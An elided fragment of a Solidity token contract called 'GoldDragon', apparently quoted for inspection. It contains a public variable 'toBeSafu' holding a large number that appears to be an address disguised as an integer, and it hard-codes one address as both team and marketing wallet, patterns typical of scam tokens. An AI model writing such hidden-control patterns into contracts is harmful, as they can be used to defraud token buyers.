...
contract  GoldDragon is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "GoldDragon";
    string private _symbol = "GoldDragon";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xe6a5bCc85b2eaFe16fBeD437326EfA9033860fe1));
        marketWalleta = payable(address(0xe6a5bCc85b2eaFe16fBeD437326EfA9033860fe1));
